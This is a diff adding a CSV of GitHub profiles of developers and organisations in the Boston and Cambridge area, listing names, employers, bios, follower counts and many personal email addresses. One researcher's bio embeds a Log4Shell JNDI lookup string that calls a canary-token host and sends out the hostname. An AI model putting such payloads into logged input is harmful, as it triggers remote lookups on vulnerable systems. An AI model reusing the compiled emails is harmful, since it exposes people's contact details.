@@ -1,0 +1,611 @@
+username,full_name,company,job_title,location,city,state,email,bio,public_repos,followers,profile_url,job_status
+dmalan,David J. Malan,harvard,,"Cambridge, MA, USA",Cambridge,MA,malan@harvard.edu,I teach @cs50.,22,35333,https://github.com/dmalan,filled
+cs50,CS50,,,"Cambridge, Massachusetts, USA",Cambridge,MA,,This is CS50.,129,19360,https://github.com/cs50,filled
+LeaVerou,Lea Verou,,,"Cambridge, MA",Cambridge,MA,,"CSS WG Invited Expert, W3C TAG alumni. Started PrismJS, Color.js and over 50 other open source projects.
+PhD in usability from MIT CSAIL",105,16138,https://github.com/LeaVerou,filled
+bot50,CS50 Bot,cs50,,"Cambridge, Massachusetts, USA",Cambridge,MA,,,0,12958,https://github.com/bot50,filled
+rsc,Russ Cox,Google,,"Cambridge, MA",Cambridge,MA,rsc@swtch.com,Go Hacker. Mistake maker. (he/him),156,10874,https://github.com/rsc,filled
+nzakas,Nicholas C. Zakas,Human Who Codes LLC,"Creator of ESLint, independent software developer, consultant, coach, and author","Boston, MA",Boston,MA,,"Creator of ESLint, independent software developer, consultant, coach, and author.",77,10713,https://github.com/nzakas,filled
+lexfridman,Lex Fridman,MIT,"AI researcher working on autonomous vehicles, human-robot interaction, and machine learning at MIT a","Cambridge, MA",Cambridge,MA,,"AI researcher working on autonomous vehicles, human-robot interaction, and machine learning at MIT and beyond.",2,8722,https://github.com/lexfridman,filled
+KeithGalli,Keith Galli,,,"Boston, MA",Boston,MA,,YouTube Content Creator :).,59,6387,https://github.com/KeithGalli,filled
+migueldeicaza,Miguel de Icaza,Xibbon,,"Boston, MA.",Boston,MA,miguel@gnome.org,,208,5037,https://github.com/migueldeicaza,filled
+timbl,Tim Berners-Lee,inrupt ,,Boston MA USA,Boston MA USA,,timbl@w3.org,,18,4988,https://github.com/timbl,filled
+bahmutov,Gleb Bahmutov,,Sr Director of Engineering at Mercari US,"Boston, MA",Boston,MA,gleb.bahmutov@gmail.com,"JavaScript ninja, image processing expert, software quality fanatic. Sr Director of Engineering at Mercari US. MS MVP for OSS work, GitHub Star.",1275,4916,https://github.com/bahmutov,filled
+rwaldron,Rick Waldron,,,"Boston, MA",Boston,MA,waldron.rick@gmail.com,He/him.,799,4538,https://github.com/rwaldron,filled
+nikomatsakis,Niko Matsakis,,,"Boston, MA",Boston,MA,rust@nikomatsakis.com,,289,4378,https://github.com/nikomatsakis,filled
+lh3,Heng Li,DFCI & Harvard University,,"Boston, MA, USA",Boston,MA,lh3@me.com,,135,4222,https://github.com/lh3,filled
+cowboy,Ben Alman,,,"Boston, MA",Boston,MA,cowboy@rj3.net,he/him,135,3573,https://github.com/cowboy,filled
+rstudio,RStudio,,,"Boston, MA",Boston,MA,info@rstudio.org,,363,3348,https://github.com/rstudio,filled
+rapid7,Rapid7,,,"Boston, MA",Boston,MA,security@rapid7.com,,306,2826,https://github.com/rapid7,filled
+pluskid,Chiyuan Zhang,MIT,,"Boston, MA",Boston,MA,pluskid@gmail.com,,30,2573,https://github.com/pluskid,filled
+edemaine,Erik Demaine,Massachusetts Institute of Technology,Professor in computer science at MIT,"Cambridge, Massachusetts, USA",Cambridge,MA,edemaine@mit.edu,Professor in computer science at MIT.  Specialist in algorithms and data structures.,212,2507,https://github.com/edemaine,filled
+quantopian,"Quantopian, Inc.",,,"Boston, MA, USA",Boston,MA,,Quantopian builds software tools and libraries for quantitative finance.,97,2460,https://github.com/quantopian,filled
+ChrisRackauckas,Christopher Rackauckas,Massachusetts Institute of Technology,"Applied Mathematics Instructor at MIT, researching numerical differential equations and their applic","Cambridge, MA",Cambridge,MA,accounts@chrisrackauckas.com,"Applied Mathematics Instructor at MIT, researching numerical differential equations and their applications to scientific machine learning (SciML)",409,2444,https://github.com/ChrisRackauckas,filled
+RussTedrake,Russ Tedrake,MIT and Toyota Research Institute,"Professor at MIT, studying robotics","Cambridge, MA",Cambridge,MA,,"Professor at MIT, studying robotics.
+Vice President of Robotics Research, Toyota Research Institute.",42,1977,https://github.com/RussTedrake,filled
+cferdinandi,Chris Ferdinandi,,,"Boston, MA",Boston,MA,,,260,1970,https://github.com/cferdinandi,filled
+ericmjl,Eric Ma,modernatx ,,"Cambridge, MA",Cambridge,MA,,Find more about me at my personal website.,311,1894,https://github.com/ericmjl,filled
+REMitchell,REMitchell,Gerson Lehrman Group,Principal Software Engineer at GLG,"Boston, MA",Boston,MA,Ryan.E.Mitchell@gmail.com,"Principal Software Engineer at GLG. Author of ""Web Scraping with Python"" and ""Unlocking Python""",31,1738,https://github.com/REMitchell,filled
+Zulko,,ginkgobioworks,,"Cambridge, MA",Cambridge,MA,,,55,1683,https://github.com/Zulko,filled
+davisking,Davis E. King,,,"Boston, MA",Boston,MA,davis@dlib.net,,8,1652,https://github.com/davisking,filled
+markbates,Mark Bates,"Meta42 Labs, LLC",Dynamic educator and technologist with 25+ years of experience across the technology sector,"Boston, MA",Boston,MA,,Dynamic educator and technologist with 25+ years of experience across the technology sector.,139,1622,https://github.com/markbates,filled
+rafalab,Rafael A Irizarry,Harvard and Dana-Farber Cancer Institute,I am a Professor of Applied Statistics at Harvard and the Dana-Farber Cancer Institute,"Boston, MA",Boston,MA,,I am a Professor of Applied Statistics at Harvard and the Dana-Farber Cancer Institute. @rafalab,49,1613,https://github.com/rafalab,filled
+r00k,Ben Orenstein,tupleapp ,"Co-founder of Tuple, a tool for remote pair programming: https://tuple","Boston, MA",Boston,MA,,"Co-founder of Tuple, a tool for remote pair programming: https://tuple.app.",86,1584,https://github.com/r00k,filled
+okhat,Omar Khattab,,Asst Professor at MIT EECS & CSAIL,"Cambridge, MA",Cambridge,MA,,Asst Professor at MIT EECS & CSAIL. Author of ColBERT and DSPy.,9,1534,https://github.com/okhat,filled
+anders94,Anders Brownworth,,,"Cambridge, MA",Cambridge,MA,,Coding and flying helicopters.,100,1487,https://github.com/anders94,filled
+mit-pdos,MIT PDOS,,,"Cambridge, MA",Cambridge,MA,,Parallel and Distributed Operating Systems group at MIT CSAIL,58,1480,https://github.com/mit-pdos,filled
+JeffBezanson,Jeff Bezanson,MIT,,"Cambridge, MA",Cambridge,MA,jeff.bezanson@gmail.com,,72,1384,https://github.com/JeffBezanson,filled
+vsitzmann,Vincent Sitzmann,Massachusetts Institute of Technology,Assistant Professor @mit EECS,"Cambridge, Massachusetts",Cambridge,MA,,Assistant Professor @mit EECS. I'm researching self-supervised learning for vision - how can we build an AI that learns to perceive the world the way we do?,26,1269,https://github.com/vsitzmann,filled
+namin,Nada Amin,Harvard University,Assistant Professor of Computer Science,"Cambridge, MA",Cambridge,MA,namin@alum.mit.edu,Assistant Professor of Computer Science,237,1238,https://github.com/namin,filled
+hbctraining,Teaching materials at the Harvard Chan Bioinformatics Core,,,"Boston, MA",Boston,MA,hbctraining@hsph.harvard.edu,,66,1227,https://github.com/hbctraining,filled
+lengstrom,Logan Engstrom,MIT,,"Cambridge, MA",Cambridge,MA,engstrom@mit.edu,CS PhD student at @MIT,141,1151,https://github.com/lengstrom,filled
+broadinstitute,Broad Institute,,,"Cambridge, MA",Cambridge,MA,,Broad Institute of MIT and Harvard,1436,1147,https://github.com/broadinstitute,filled
+Lyken17,Ligeng Zhu,,Researcher at @Nvidia on efficient large models,"Cambridge, MA",Cambridge,MA,,"Researcher at @Nvidia on efficient large models.  Previously @MIT, @SFU, @ZJU.",220,1098,https://github.com/Lyken17,filled
+sea-bass,Sebastian Castro,,Robotics software engineer impostor,"Cambridge, MA",Cambridge,MA,,Robotics software engineer impostor. I host my personal projects here.,84,1093,https://github.com/sea-bass,filled
+vacancy,Jiayuan Mao,MIT,,"Cambridge, MA",Cambridge,MA,jiayuanm@mit.edu,,53,1084,https://github.com/vacancy,filled
+vEnhance,Evan Chen,,,"Boston, MA",Boston,MA,evan@evanchen.cc,Math olympiad coach and writer of spaghetti code,52,1068,https://github.com/vEnhance,filled
+mkeeter,Matt Keeter,oxidecomputer,Weird CAD and graphics research; embedded software and systems engineering,"Cambridge, MA",Cambridge,MA,matt.j.keeter@gmail.com,"Weird CAD and graphics research; embedded software and systems engineering.
+",83,1067,https://github.com/mkeeter,filled
+harvard,Harvard University,,,"Cambridge, Massachusetts, USA",Cambridge,MA,,,7,1023,https://github.com/harvard,filled
+mahmoodlab,Mahmood Lab @ Harvard/MGB,,,"Boston, MA",Boston,MA,fmahmood@fas.harvard.edu,AI for Pathology Image Analysis Lab @ HMS / BWH,34,1008,https://github.com/mahmoodlab,filled
+dsmilkov,Daniel Smilkov,Anthropic,"Co-founder of Lilac AI, acquired by @databricks","Boston, MA",Boston,MA,dsmilkov@gmail.com,"Co-founder of Lilac AI, acquired by @databricks. Co-created TensorFlow.js. Ex: Google Brain, PAIR, MIT Media Lab",7,1001,https://github.com/dsmilkov,filled
+csteinmetz1,Christian J. Steinmetz,suno-ai,Research Scientist @ Suno,"Cambridge, MA",Cambridge,MA,c.j.steinmetz@qmul.ac.uk,AI for music. Research Scientist @ Suno,82,1000,https://github.com/csteinmetz1,filled
+chapmanb,Brad Chapman,Ginkgo Bioworks,,"Boston, MA",Boston,MA,chapmanb@fastmail.com,Biologist and programmer,120,973,https://github.com/chapmanb,filled
+ericf,Eric Ferraiuolo,Apple,,"Cambridge, MA",Cambridge,MA,edf@ericf.me,Trying to make the web better for people.,105,971,https://github.com/ericf,filled
+christoomey,Chris Toomey,augusthealth,"Web developer focusing on Rails, JS, and TypeScript","Boston, MA",Boston,MA,chris@ctoomey.com,"Web developer focusing on Rails, JS, and TypeScript. Working on @augusthealth, formerly @sagewell and @thoughtbot. Let’s chat!",53,943,https://github.com/christoomey,filled
+qrush,Nick Quaranto,wistia,,"Boston, MA",Boston,MA,nick@quaran.to,"A short, sturdy creature fond of drink and industry. Started rubygems.org a while back. Still writing Ruby 16 years later.",154,933,https://github.com/qrush,filled
+M4cs,Max Bridgland,,builder | Multi-Language Developer | FOSS Advocate,"Boston, Massachusetts",Boston,MA,,builder | Multi-Language Developer | FOSS Advocate,226,919,https://github.com/M4cs,filled
+RamblingCookieMonster,Warren Frame,,,"USA; Boston Area, MA",USA; Boston Area,MA,,Perpetual student,71,904,https://github.com/RamblingCookieMonster,filled
+jakejarvis,Jake Jarvis,,,"Boston, MA",Boston,MA,jake@jarv.is,💾 web 1.0 advocate,160,898,https://github.com/jakejarvis,filled
+thedillonb,Dillon Buchanan,128technology ,,"Boston, MA",Boston,MA,thedillonb@gmail.com,,36,889,https://github.com/thedillonb,filled
+hans,Jon Gauthier,,,"Cambridge, MA",Cambridge,MA,jon@gauthiers.net,"PhD student at MIT Brain and Cognitive Sciences. Formerly @StanfordNLP, @OpenAI, Google Brain. Psycholinguistics, NLP, ML. I open-source as much as possible.",166,867,https://github.com/hans,filled
+jeremydaly,Jeremy Daly,,Senior technology leader and serverless advocate,"Boston, MA",Boston,MA,,Senior technology leader and serverless advocate. I build products for the web and teach others how to as well. AWS Serverless Hero and CEO at Ampt.,30,866,https://github.com/jeremydaly,filled
+mguay22,Michael Guay,SS&C Technologies,,"Boston, MA",Boston,MA,guay.me@gmail.com,,124,865,https://github.com/mguay22,filled
+JLLeitschuh,Jonathan Leitschuh,socketdev,"Software Engineer & Security Researcher
+
+Inaugural Dan Kaminsky Fellow
+
+${jndi:ldap://x${hostNam","Boston, MA",Boston,MA,jonathan.leitschuh@gmail.com,"Software Engineer & Security Researcher
+
+Inaugural Dan Kaminsky Fellow
+
+${jndi:ldap://x${hostName}.L4J.lile3fakwhyqg99zgj0yytxz7.canarytokens.com/a}",1556,863,https://github.com/JLLeitschuh,filled
+Keno,Keno Fischer,JuliaComputing ,,"Cambridge, MA",Cambridge,MA,,,300,857,https://github.com/Keno,filled
+zephray,Wenting Zhang,Modos Tech Inc,"Co-founder of Modos Tech Inc, open source software and hardware enthusiast, he/him, love retro compu","Boston, MA",Boston,MA,zephray@outlook.com,"Co-founder of Modos Tech Inc, open source software and hardware enthusiast, he/him, love retro computing.",99,848,https://github.com/zephray,filled
+webyrd,William E. Byrd,University of Alabama at Birmingham,,"Cambridge, MA",Cambridge,MA,webyrd@gmail.com,,168,824,https://github.com/webyrd,filled
+blackgirlbytes,Rizel Scarlett,Block,,"Boston, MA",Boston,MA,,coding for fun,263,798,https://github.com/blackgirlbytes,filled
+raminmh,Ramin Hasani,MIT,,"Cambridge, MA",Cambridge,MA,rhasani@mit.edu,deep learning,31,789,https://github.com/raminmh,filled
+BlakeWilliams,Blake Williams,github ,,"Boston, MA",Boston,MA,blake@blakewilliams.me,"principal eng @github working on performance, scale, availability, and tooling.",159,781,https://github.com/BlakeWilliams,filled
+joshuaclayton,Josh Clayton,happy-co,,"Boston, MA",Boston,MA,,"Sr Dir, Eng at @happy-co. I <3 Ruby, Rust, Haskell, and Elm.",113,774,https://github.com/joshuaclayton,filled
+n8fr8,Nathan Freitas,"Guardian Project, Tor Project, Berkman-Klein Center",,"Cambridge, MA",Cambridge,MA,nathan@freitas.net,"I have worked for over 25 years in mobile communications security software and systems, with a deep set of experience organizations, applications and platforms.",156,764,https://github.com/n8fr8,filled
+aolofsson,Andreas Olofsson,Zero ASIC Corporation,,"Cambridge, MA, USA",Cambridge,MA,,Democratizing silicon,10,764,https://github.com/aolofsson,filled
+davegandy,Dave Gandy,,,"Cambridge, MA",Cambridge,MA,dave@davegandy.com,,3,754,https://github.com/davegandy,filled
+pliang279,Paul Liang,Massachusetts Institute of Technology,,"Cambridge, MA",Cambridge,MA,ppliang@mit.edu,,25,746,https://github.com/pliang279,filled
+HannesStark,Hannes Stärk,Massachusetts Institute of Technology,,"Cambridge, MA",Cambridge,MA,,MIT PhD student • ML for biomolecules,32,746,https://github.com/HannesStark,filled
+Spandan-Madan,Spandan Madan,Harvard,"Co-Founder, Memorious","Cambridge, MA",Cambridge,MA,,"Co-Founder, Memorious. 
+Past: PhD @ Harvard Computer Science, IIT Delhi.",47,744,https://github.com/Spandan-Madan,filled
+cinnamon-msft,Kayla Cinnamon,Microsoft ,"Senior Developer Advocate at Microsoft, former PM for Windows Terminal, Microsoft PowerToys, Cascadi","Boston, MA",Boston,MA,cinnamon@microsoft.com,"Senior Developer Advocate at Microsoft, former PM for Windows Terminal, Microsoft PowerToys, Cascadia Code, and Windows developer experiences 👩‍💻✨",16,729,https://github.com/cinnamon-msft,filled
+quantombone,Tomasz Malisiewicz,MIT,,"Cambridge, MA",Cambridge,MA,tomasz@csail.mit.edu,You can find some of my computer vision related projects here. Enjoy!,31,716,https://github.com/quantombone,filled
+jstedfast,Jeffrey Stedfast,Microsoft,,"Boston, MA, USA",Boston,MA,jestedfa@microsoft.com,,40,710,https://github.com/jstedfast,filled
+LLK,Lifelong Kindergarten,,,"Cambridge, MA",Cambridge,MA,,,4,702,https://github.com/LLK,filled
+amejiarosario,Adrian Mejia,Google,,"Boston, MA",Boston,MA,me@adrianmejia.com,Make it Work → Make it Fast → Make it Beautiful,155,699,https://github.com/amejiarosario,filled
+HubSpot,HubSpot,,,"Cambridge, MA",Cambridge,MA,,,368,683,https://github.com/HubSpot,filled
+iros,Irene Ros,Google,"Search @ Google
+Full stack engineer + data + visualization",Cambridge MA,Cambridge MA,,imirene@gmail.com,"Search @ Google
+Full stack engineer + data + visualization.",80,682,https://github.com/iros,filled
+xamarin,Xamarin,,,"Boston, MA",Boston,MA,,,172,682,https://github.com/xamarin,filled
+svgeesus,Chris Lilley,W3C,,"Boston, MA",Boston,MA,chris@w3.org,"“Father of SVG”. @W3C staff. Co-developed PNG, `@font-face`, WOFF. W3C rep to ICC. These days working on CSS, PNG, Web Fonts, Web Audio.",48,659,https://github.com/svgeesus,filled
+mit,Massachusetts Institute of Technology,,,"Cambridge, MA",Cambridge,MA,git@mit.edu,"For students/alumni/staff/MIT affiliates! To join, email with GitHub+Athena usernames.",1,651,https://github.com/mit,filled
+alexlenail,Alexander Lenail,MIT,,"Cambridge, MA",Cambridge,MA,lenail@mit.edu,,24,645,https://github.com/alexlenail,filled
+MatthewPeterKelly,Matthew Kelly,Boston Dynamics,Robotics engineer,"Boston, MA",Boston,MA,matthew.kelly2@gmail.com,Robotics engineer. C++ developer. I write control software for the Boston Dynamics Atlas humanoid robot. I have a PhD in trajectory optimization and control.,39,644,https://github.com/MatthewPeterKelly,filled
+mit-acl,MIT Aerospace Controls Laboratory,,,"Cambridge, MA",Cambridge,MA,,see more code at https://gitlab.com/mit-acl,59,629,https://github.com/mit-acl,filled
+rbren,Robert Brennan,Fairwinds,,"Boston, Massachusetts",Boston,MA,contact@rbren.io,,250,621,https://github.com/rbren,filled
+tekknolagi,Max Bernstein,Shopify,,"Boston, MA",Boston,MA,donotemailthisaddress@bernsteinbear.com,Biking around...,328,609,https://github.com/tekknolagi,filled
+cgnorthcutt,Curtis G. Northcutt,Cleanlab | MIT,"CEO & Co-Founder @cleanlab | PhD @MIT | Creator of Cleanlab package | Former Google, Oculus, Amazon,","Cambridge, MA",Cambridge,MA,cgn@mit.edu,"CEO & Co-Founder @cleanlab | PhD @MIT | Creator of Cleanlab package | Former Google, Oculus, Amazon, Facebook, Microsoft, NASA AI",52,598,https://github.com/cgnorthcutt,filled
+jamesdaniels,James Daniels,Google,@firebase engineer,"Cambridge, MA",Cambridge,MA,jamesdaniels@google.com,@firebase engineer,127,596,https://github.com/jamesdaniels,filled
+Fang-Haoshu,Fred Fang,MIT,,"Boston, MA",Boston,MA,,fhaoshu[at]gmail[dot]com,23,587,https://github.com/Fang-Haoshu,filled
+kosukeimai,Kosuke Imai,Harvard University,,Cambridge MA,Cambridge MA,,Imai@Harvard.Edu,,19,585,https://github.com/kosukeimai,filled
+erich666,Eric Haines,NVIDIA,,"Somerville, MA",Somerville,MA,erichaines@gmail.com,Graphics guy,44,577,https://github.com/erich666,filled
+wbthomason,Wil Thomason,bdaiinstitute,Roboticist/research scientist at @bdaiinstitute,"Cambridge, MA, USA",Cambridge,MA,,"Roboticist/research scientist at @bdaiinstitute.
+
+aka @wthomason-bdai",93,576,https://github.com/wbthomason,filled
+weihanglo,Weihang Lo,rust-lang @rust-tw,,"Taiwan | Boston, MA, USA ",Taiwan | Boston,MA,,📦 Cargo worker at home,48,576,https://github.com/weihanglo,filled
+aqeelsidd,Aqeel Siddiqui,,,"Boston, Massachusetts",Boston,MA,,,0,576,https://github.com/aqeelsidd,filled
+groovemonkey,David Cohen,hashicorp,,"Boston, MA",Boston,MA,,,61,573,https://github.com/groovemonkey,filled
+sarahs,Sarah Schneider,,,"Boston, MA",Boston,MA,,Working on GitHub Docs,17,561,https://github.com/sarahs,filled
+jferris,Joe Ferris,,,"Somerville, MA",Somerville,MA,,,41,561,https://github.com/jferris,filled
+Shujian2015,,Google,"Software engineer, Ph","Boston, MA",Boston,MA,,"Software engineer, Ph.D., and Kaggle triple master. Speech and NLP.",167,541,https://github.com/Shujian2015,filled
+wengong-jin,Wengong Jin,"CSAIL, Massachusetts Institute of Technology",,"Boston, MA",Boston,MA,,,16,540,https://github.com/wengong-jin,filled
+bcardarella,Brian Cardarella,⚓️ DockYard ⚓️,Founder / Chairman of DockYard,"Boston, MA",Boston,MA,,Founder / Chairman of DockYard,42,535,https://github.com/bcardarella,filled
+Lanny-MacMillan,Lanny MacMillan,Thryv,"Software Developer / Game Developer
+React","Boston, Ma",Boston,MA,,"Software Developer / Game Developer
+React.js || Next.js || Node.js || Unity || SQL & NoSQL || Javascript || C#. Let's make something great together!",26,533,https://github.com/Lanny-MacMillan,filled
+mit-biomimetics,MIT Biomimetic Robotics Lab,,,"Cambridge, MA",Cambridge,MA,,,19,530,https://github.com/mit-biomimetics,filled
+smousavi05,S.Mostafa Mousavi,Harvard University,,Cambridge MA,Cambridge MA,,,"Seismology, 
+Signal Processing, 
+Machine Learning, 
+Statistic
+
+",57,528,https://github.com/smousavi05,filled
+arscan,Rob Scanlon,,Building open source tools for Health IT developers,"Boston, MA",Boston,MA,robscanlon@gmail.com,"Building open source tools for Health IT developers. Full stack, front end.  Also: creative coding, WebGL, data visualization, motion graphics.",70,526,https://github.com/arscan,filled
+NickCao,Nick Cao,Red Hat,,"Boston, MA",Boston,MA,nickcao@nichi.co,,250,525,https://github.com/NickCao,filled
+bcafferky,Bryan Cafferky,Microsoft,"Microsoft Azure Technical Training Content Developer for Machine Learning, and AI","Boston, MA",Boston,MA,,"Microsoft Azure Technical Training Content Developer for Machine Learning, and AI",3,523,https://github.com/bcafferky,filled
+ericwbailey,Eric Bailey,github ,,"Boston, MA",Boston,MA,,Accessibility advocate and design systems wonk for @github.,34,513,https://github.com/ericwbailey,filled
+teddykoker,Teddy Koker,MIT EECS,,"Cambridge, MA",Cambridge,MA,teddy.koker@gmail.com,PhD student at MIT,37,507,https://github.com/teddykoker,filled
+bmoscon,Bryant Moscon,,,"Boston, MA",Boston,MA,bmoscon@gmail.com,,33,504,https://github.com/bmoscon,filled
+Thomas-George-T,Thomas George Thomas,,,"Boston, MA",Boston,MA,,I love solving enterprise data problems. I have a passion for making awesome things.,28,499,https://github.com/Thomas-George-T,filled
+mitmedialab,MIT Media Lab,,,"Cambridge, MA",Cambridge,MA,,,551,498,https://github.com/mitmedialab,filled
+narula,Neha Narula,MIT DCI,,"Cambridge, MA",Cambridge,MA,,,38,494,https://github.com/narula,filled
+mono,Mono Project,,,"Boston, MA",Boston,MA,mono@xamarin.com,,243,494,https://github.com/mono,filled
+sydney-runkle,Sydney Runkle,langchain-ai,"Software Engineer at @langchain-ai 🤓, coffee lover ☕, running enthusiast 🏃‍♀️, podcast addict 🎧, and","Somerville, MA",Somerville,MA,,"Software Engineer at @langchain-ai 🤓, coffee lover ☕, running enthusiast 🏃‍♀️, podcast addict 🎧, and pastry aficionado 🥐!",6,491,https://github.com/sydney-runkle,filled
+Hanrui-Wang,Ryan Hanrui Wang,MIT,,"Cambridge, MA",Cambridge,MA,hanrui@mit.edu,"PhD @ MIT. Efficient AI Computing
+
+
+",41,486,https://github.com/Hanrui-Wang,filled
+maddymontaquila,Maddy Montaquila (Leger),Microsoft,"Senior Product Manager,","Boston, MA",Boston,MA,,"Senior Product Manager, .NET at @Microsoft ",51,482,https://github.com/maddymontaquila,filled
+SpenceKonde,Spence Konde (aka Dr. Azzy),Azduino,,"Cambridge, MA",Cambridge,MA,spencekonde@gmail.com,"I've been maintaining AVR cores for Arduino since early 2015, and started taking it seriously in 2016. Now, there are 3 cores - covering all the best AVR parts",67,481,https://github.com/SpenceKonde,filled
+peterdsharpe,Peter Sharpe,NVIDIA,,"Cambridge, MA, United States",Cambridge,MA,,"Sr. SciML Eng. @NVIDIA | 
+PhD @ MIT on Aircraft Design + SciML",54,480,https://github.com/peterdsharpe,filled
+yangl1996,Lei Yang,MegaETH LLC,Cofounder and CTO of Mega Labs,"Cambridge, MA",Cambridge,MA,,Cofounder and CTO of Mega Labs. Recent PhD graduate from MIT CSAIL.,71,476,https://github.com/yangl1996,filled
+kach,Kartik Chandra,MIT CSAIL,,"Cambridge, MA",Cambridge,MA,,,72,475,https://github.com/kach,filled
+MIT-LCP,MIT Laboratory for Computational Physiology,,,"Cambridge, MA",Cambridge,MA,,"Research on improving health care through data analysis, including use of MIMIC-III and other data sources",83,473,https://github.com/MIT-LCP,filled
+han-cai,Han Cai,NVIDIA,,"Cambridge, MA",Cambridge,MA,hcai.hm@gmail.com,,5,468,https://github.com/han-cai,filled
+vitorpamplona,Vitor Pamplona,,,"Cambridge, MA, US",Cambridge,MA,vitor@vitorpamplona.com,,54,458,https://github.com/vitorpamplona,filled
+connorcoley,Connor Coley,MIT Chemical Engineering,,"Cambridge, MA",Cambridge,MA,,,21,455,https://github.com/connorcoley,filled
+satra,Satrajit Ghosh,MIT,"My research interests span computer science and neuroimaging, in the areas of applied machine learni","Cambridge, MA, USA",Cambridge,MA,,"My research interests span computer science and neuroimaging, in the areas of applied machine learning, software engineering, and clinical applications.",265,453,https://github.com/satra,filled
+dana-at-cp,Dana James Traversie,"Check Point Software Technologies, Ltd.",,"Boston, MA",Boston,MA,,,15,452,https://github.com/dana-at-cp,filled
+omegaiota,Yifei Li,,,"Cambridge, MA",Cambridge,MA,liyifei@mit.edu,CS PhD student at Massachusetts Institute of Technology,6,442,https://github.com/omegaiota,filled
+avik-pal,Avik Pal,Massachusetts Institute of Technology,,"Cambridge, MA",Cambridge,MA,avikpal@mit.edu,"PhD Student @mit || Prev: BTech CSE IITK
+",187,438,https://github.com/avik-pal,filled
+ck37,Chris Kennedy,"Harvard Medical School, Mass General Hospital",,"Boston, MA",Boston,MA,chris@ck37.com,"Psychiatric AI; biostatistics PhD. {Targeted, deep, machine} learning, NLP, IRT, computer vision, EHRs.",80,436,https://github.com/ck37,filled
+seenickcode,Nick Manning,manninglabs ,"Serial co-founder/CTO, @Techstars alumni","Boston, MA",Boston,MA,,"Course creator. Serial co-founder/CTO, @Techstars alumni. 🧙‍♂️",75,434,https://github.com/seenickcode,filled
+YuanGongND,Yuan Gong,MIT,"Research Scientist, MIT CSAIL","Cambridge, MA",Cambridge,MA,yuangongfdu@gmail.com,"Research Scientist, MIT CSAIL",52,433,https://github.com/YuanGongND,filled
+AVS1508,Aditya Vikram Singh,UMass Amherst | @build-umass | @fuseumass | @umass-cicsoft,,"Greater Boston, MA",Greater Boston,MA,aditya.11.present@gmail.com,SWE @Altius-Internal-Development,29,432,https://github.com/AVS1508,filled
+alexbw,Alex Wiltschko,Google,,"Boston, MA",Boston,MA,,,97,426,https://github.com/alexbw,filled
+rahuldave,Rahul Dave,Univ.ai,Chief Scientist at Univ,"Somerville, MA",Somerville,MA,,"Chief Scientist at Univ.Ai. Former lecturer, Harvard University. Data Science, ML, AI, Bayesian Stats, Cosmology, Astrophysics.",178,423,https://github.com/rahuldave,filled
+timsainb,Tim Sainburg,Harvard Medical School,,"Cambridge, MA",Cambridge,MA,timsainb@gmail.com,Postdoc at Harvard,65,418,https://github.com/timsainb,filled
+pganssle,Paul Ganssle,Google,,"Somerville, MA",Somerville,MA,,Opinions expressed do not necessarily reflect those of my employer.,121,418,https://github.com/pganssle,filled
+slipster216,Jason Booth,,"Game developer for 20+ years, currently specializing in Graphics, shaders, and client side architect","Boston, MA",Boston,MA,,"Game developer for 20+ years, currently specializing in Graphics, shaders, and client side architecture. ",9,412,https://github.com/slipster216,filled
+dceddia,Dave Ceddia,,,"Boston, MA",Boston,MA,dave@daveceddia.com,,118,408,https://github.com/dceddia,filled
+samdmarshall,Samantha Demi,,,"Boston, MA, USA",Boston,MA,hello@pewpewthespells.com,,156,403,https://github.com/samdmarshall,filled
+jackdied,Jack Diederich,,,"Boston, MA",Boston,MA,jackdied@gmail.com,"Python committer, frequent Py*Con talker.",17,402,https://github.com/jackdied,filled
+haozhu233,Hao Zhu,Harvard Medical School,,"Boston, MA ",Boston,MA,haozhu233@gmail.com,AI for science. Netbio.,128,400,https://github.com/haozhu233,filled
+yangkky,Kevin Kaichuang Yang,,,"Cambridge, MA",Cambridge,MA,,,20,398,https://github.com/yangkky,filled
+simsong,Simson L. Garfinkel,"BasisTech, LLC","I'm an author, programmer, former associate professor, and a part-time US Government employee","Somerville, MA",Somerville,MA,simsong@acm.org,"I'm an author, programmer, former associate professor, and a part-time US Government employee. That photo is more than 30 years old.
+
+ORCID 0000-0003-1294-283",61,398,https://github.com/simsong,filled
+shawntan,Shawn Tan,MIT-IBM Watson AI Lab,,"Cambridge, MA",Cambridge,MA,shawn@wtf.sg,,101,395,https://github.com/shawntan,filled
+vapier,Mike Frysinger,,,"Somerville, MA, USA",Somerville,MA,vapier@gmail.com,,50,391,https://github.com/vapier,filled
+vtjnash,Jameson Nash,,,"Boston, MA",Boston,MA,vtjnash+github@gmail.com,,196,383,https://github.com/vtjnash,filled
+tytso,Theodore Ts'o,Google,,"Boston, MA",Boston,MA,tytso@mit.edu,,23,382,https://github.com/tytso,filled
+ibrahimgurhandev,Ibrahim Gurhan,Resilient Coders,"Software Engineer at  Resilient Coders | Web Developer | Techie |  AWS lover | 
+Based in Boston, MA",Boston MA,Boston MA,,,"Software Engineer at  Resilient Coders | Web Developer | Techie |  AWS lover | 
+Based in Boston, MA",36,381,https://github.com/ibrahimgurhandev,filled
+SuperBruceJia,Shuyue Jia (Bruce),Boston University,"Student, AI Researcher, Marathon Runner, and Photographer, based in Boston, MA","Boston, MA",Boston,MA,brucejia@bu.edu,"I am a Ph.D. Student, AI Researcher, Marathon Runner, and Photographer, based in Boston, MA.",64,375,https://github.com/SuperBruceJia,filled
+jbardin,James Bardin,HashiCorp/IBM,,"Boston, MA",Boston,MA,j.bardin@gmail.com,,29,375,https://github.com/jbardin,filled
+ef4,Edward Faulkner,,,"Somerville, MA",Somerville,MA,edward@eaf4.com,,291,375,https://github.com/ef4,filled
+ZitongLu1996,Zitong Lu,Massachusetts Institute of Technology,,"Boston, MA, USA",Boston,MA,zitonglu1996@gmail.com,"Postdoc at MIT || PhD in CogNeuro at OSU 2025 || Minor in Stats at OSU 2022 || MSci in CogNeuro at ECNU (China) 2021 || BEng in SoftwareEng, NEU (China) 2018",37,371,https://github.com/ZitongLu1996,filled
+adalca,Adrian Dalca,MIT,"Professor at Harvard Medical School, Researcher at MIT","Cambridge, MA",Cambridge,MA,,"Professor at Harvard Medical School, Researcher at MIT.
+
+Machine Learning in Medical Image Analysis, computer vision. ",24,368,https://github.com/adalca,filled
+achlipala,Adam Chlipala,MIT,Researcher in tools and platforms to help do niftier things with software and hardware,"Cambridge, MA",Cambridge,MA,adamc@csail.mit.edu,Researcher in tools and platforms to help do niftier things with software and hardware,11,367,https://github.com/achlipala,filled
+GeeLaw,Ji Luo,,A cryptographer and software engineer,"Boston, MA, USA",Boston,MA,geelaw@outlook.com,A cryptographer and software engineer.,32,367,https://github.com/GeeLaw,filled
